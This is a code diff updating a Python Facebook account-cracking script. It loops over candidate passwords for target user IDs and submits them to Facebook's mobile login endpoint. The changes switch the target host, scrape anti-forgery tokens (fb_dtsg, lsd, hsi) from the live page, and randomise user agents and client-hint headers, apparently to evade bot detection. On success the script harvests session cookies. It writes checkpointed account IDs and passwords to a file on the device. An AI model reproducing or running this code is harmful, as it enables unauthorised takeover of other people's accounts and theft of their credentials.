@@ -1465,44 +1465,32 @@ def x(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = random.choice(uas)            
+            ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
-            cookies = {
-            'datr': 'SVRVaCkSemjPQelgXB0y0CcL',
-            'sb': 'SVRVaPjD8b4EFyHYH5_mO7WT',
-            'ps_l': '1',
-            'ps_n': '1',
-            'dpr': '3.5',
-            'm_pixel_ratio': '2',
-            'wd': '400x686',
-            'fr': '0gLfD3AAbAoY0O6GN..BoVVRJ..AAA.0.0.BohTVs.AWcP0RAAfKpOFR2ynJHzhb7O4rM',}
-            params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
-            'type': 'action',
-            '__bkv': '7dc3df7a1c2b41c2ef275eac1130af6da64453b8e5de853b8cf45b43c64d127b',}
+            head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"}
+            resp = Session.get('https://m.facebook.com/', headers=head).text
             data = {
     '__aaid': '0',
     '__user': '0',
     '__a': '1',
-    '__req': '7',
-    '__hs': '20295.BP:wbloks_caa_pkg.2.0...0',
+    '__req': str(random.randint(1,9)),
+    '__hs': re.search('"haste_session":"(.*?)"',str(resp)).group(1),
     'dpr': '3',
-    '__ccg': 'GOOD',
-    '__rev': '1025188331',
-    '__s': ':oc3pxr:qmixkl',
-    '__hsi': '7531484493576691349',
-    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde0UE',
-    'fb_dtsg': 'NAfsqk3zn7XQsOBhUm_qeOsssCdIRQbrgFez63iJ13sgQe4oM3bsaPw:0:0',
+    '__ccg': 'EXCELLENT',
+    '__rev': '1023608600',
+    '__s': ':f95eey:i9v0n0',
+    '__hsi': re.search('"hsi":"(\d+)"',str(resp)).group(1),
+    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
+    'fb_dtsg': re.search('"dtsg":{"token":"(.*?)"',str(resp)).group(1),
     'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
     'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'params': {
+    'params': json.dumps({
         "params": json.dumps({
             "server_params": {
                 "credential_type": "password",
-                "username_text_input_id": "okr4cr:67",
-                "password_text_input_id": "okr4cr:68",
-                "login_source": "Login",
+                "username_text_input_id": "7w9omu:68",
+                "password_text_input_id": "7w9omu:69",
+                "login_source": "login",
                 "login_credential_type": "none",
                 "server_login_source": "login",
                 "ar_event_source": "login_home_page",
@@ -1518,12 +1506,11 @@ def x(uid,pwx,tl):
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
                 "two_step_login_type": "one_step_login",
-                "is_vanilla_password_page_empty_password": 0,
                 "INTERNAL__latency_qpl_marker_id": 36707139,
-                "INTERNAL__latency_qpl_instance_id": "148604589900415",
+                "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
                 "family_device_id": None,
-                "waterfall_id": "8fd04dc0-a611-473e-9035-4d8c14924484",
+                "waterfall_id": str(uuid.uuid4),
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
                 "is_platform_login": 0,
@@ -1534,7 +1521,6 @@ def x(uid,pwx,tl):
             "client_input_params": {
                 "machine_id": "",
                 "cloud_trust_token": None,
-                "block_store_machine_id": "",
                 "contact_point": uid,
                 "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                 "accounts_list": [],
@@ -1547,6 +1533,7 @@ def x(uid,pwx,tl):
                 "event_flow": "login_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
+                "block_store_machine_id": "",
                 "auth_secure_device_id": "",
                 "client_known_key_hash": "",
                 "has_whatsapp_installed": 0,
@@ -1556,55 +1543,46 @@ def x(uid,pwx,tl):
                 "has_granted_read_contacts_permissions": 0,
                 "has_granted_read_phone_permissions": 0,
                 "app_manager_id": "",
-                "aymh_accounts": [{
-                    "id": "",
-                    "profiles": {
-                        "id": {
-                            "user_id": "",
-                            "name": "",
-                            "profile_picture_url": "",
-                            "small_profile_picture_url": None,
-                            "notification_count": 0,
-                            "credential_type": "none",
-                            "token": "",
-                            "last_access_time": 0,
-                            "is_derived": 0,
-                            "username": "",
-                            "password": "",
-                            "has_smartlock": 0,
-                            "account_center_id": "",
-                            "account_source": "",
-                            "credentials": [],
-                            "nta_eligibility_reason": None,
-                            "from_accurate_privacy_result": 0,
-                            "dbln_validated": 0
-                        }
-                    }
-                }],
+                "aymh_accounts": [],
                 "lois_settings": {
                     "lois_token": ""
                 }
             }
         })
-    }
+    }),
 }
             headers = {
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'origin': 'https://m.facebook.com',
-            'priority': 'u=1, i',
-            'referer': 'https://m.facebook.com/ig/login_via/app/?refsrc=deprecated&lid=0x3mgGpzokXhUxNtZ&bn=Y29tLmFuZHJvaWQuY2hyb21l',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',}
+            "host": "touch.facebook.com",
+            "content-length": (";").join([ "%s=%s" % (key, value) for key, value in data.items() ]),
+            "sec-ch-ua-full-version-list": "\"Not;A=Brand\";v=\"99.0.0.0\", \"Nokia Webview\";v=\""+f"{str(random.randint(127,139))}.0.{str(random.randint(5111,8999))}.{str(random.randint(111,299))}"+"\", \"Chromium\";v=\""+f"{str(random.randint(127,139))}.0.{str(random.randint(5111,8999))}.{str(random.randint(111,299))}"+"\"",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Nokia Webview\";v=\""+str(random.randint(127,139))+"\", \"Chromium\";v=\""+str(random.randint(127,139))+"\"",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-prefers-color-scheme": "dark",
+            "user-agent": ____PO_CO____(),
+            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "x-response-format": "JSONStream",
+            "sec-ch-ua-platform-version": "\"\"",
+            "accept": "*/*",
+            "origin": "https://touch.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "x-fb-lsd": re.search('"lsd":"(.*?)"',str(resp)).group(1),
+            "referer": "https://touch.facebook.com/",
+            "accept-encoding": "gzip, deflate",
+            "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8",
+            "x-requested-with": "XMLHttpCanary",
+            "connection-web-socket": str(random.randint(0,1000)),
+            "priority": "u=1, i",
+            "x-fb-dtsg-token": re.search('"dtsg":{"token":"(.*?)"',str(resp)).group(1),
+            "cookie": (";").join([ "%s=%s" % (key, value) for key, value in Session.cookies.get_dict().items() ]),}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/async/wbloks/fetch/"
-            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
+            url = "https://touch.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=702c2f684e5cb91415ff73ea04c6b82d5580487fbd0a90975765b0adee500940"
+            response = Session.post(url, data=data, headers=headers)
+            res = Session.cookies.get_dict().keys()
+            if 'com.bloks.www.caa.login.save-credentials' in str(response.text.replace('\\', ' ')):
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
@@ -1622,7 +1600,7 @@ def x(uid,pwx,tl):
                         break
                 else:
                     break
-            elif 'checkpoint' in response:
+            elif 'com.bloks.www.two_step_verification.entrypoint' in str(response.text.replace('\\', ' ')):
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                 #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
